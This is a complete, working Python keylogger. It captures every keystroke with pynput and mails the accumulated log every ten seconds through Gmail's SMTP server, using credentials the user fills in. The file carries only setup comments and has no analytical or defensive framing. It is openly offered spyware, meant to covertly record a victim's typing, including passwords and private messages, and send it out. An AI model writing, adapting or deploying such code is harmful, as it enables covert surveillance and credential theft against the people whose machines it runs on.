#!/usr/bin/env python

import pynput.keyboard as keyboard
import threading
import smtplib


class Keylogger:

    def __init__(self, time_inter, email,passw):
        self.interval = time_inter                  # Timer to send mail
        self.email = email
        self.password = passw
        self.log = "Keylogger Started"              # Variable to store the keylogs..

    def process_key_press(self, key):
        try:
            self.log = self.log + str(key.char)      # Print Only Characters

        except AttributeError:
            if key == key.space:                     # If key is Space just print a " "
                self.log = self.log + " "
            else:
                self.log = self.log + " " + str(key) + " "     # Any other key just print it with spaces either side

    def send_mail(self, email, passw, msg):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()                                       #Make Sure to allow low-security apps in gmail.account {Otherwise it doesnt allow login}
        server.login(email, passw)
        server.sendmail(email, email, msg)
        server.quit()

    def report(self):
        self.send_mail(self.email,self.password, "\n\n" + self.log)         # Semd Mail
        self.log = " "                                                      # Empty Log After Sending
        timer = threading.Timer(self.interval, self.report)                 # Threading function to run this function recursively on another thread
        timer.start()

    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.process_key_press)   # Create Instance
        with keyboard_listener:                                                  # Method to implement keyboard listener
            self.report()                                                        # See Documentation
            keyboard_listener.join()


my_keylog = Keylogger(10, "YourGmail", "Yourpass")                #Change the seconds , email and pass to urs
my_keylog.start()
